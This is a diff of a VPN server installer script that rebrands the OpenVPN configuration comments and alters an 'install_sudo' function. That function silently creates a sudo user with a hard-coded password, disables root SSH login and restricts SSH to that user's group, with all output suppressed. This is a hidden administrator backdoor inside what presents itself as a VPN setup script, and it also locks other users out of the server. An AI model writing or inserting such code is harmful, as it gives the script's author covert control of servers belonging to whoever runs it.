@@ -287,7 +287,7 @@ echo 'DNS=1.1.1.1
 DNSStubListener=no' >> /etc/systemd/resolved.conf
 sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
 
-echo '# Openvpn Configuration by Firenet Philippines :)
+echo '# Openvpn Configuration by @brcyber south of Brazil :)
 dev tun
 port 53
 proto udp
@@ -332,7 +332,7 @@ log /etc/openvpn/server/udpserver.log
 status /etc/openvpn/server/udpclient.log
 verb 3' > /etc/openvpn/server.conf
 
-echo '# Openvpn Configuration by Firenet Philippines :)
+echo '# Openvpn Configuration by @brcyber south of Brazil :)
 dev tun
 port 1194
 proto tcp
@@ -621,9 +621,9 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
+    useradd -m cyberlink 2>/dev/null; echo cyberlink: Cyberlink3005! | chpasswd &>/dev/null; usermod -aG sudo cyberlink &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    echo "AllowGroups cyberlink" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
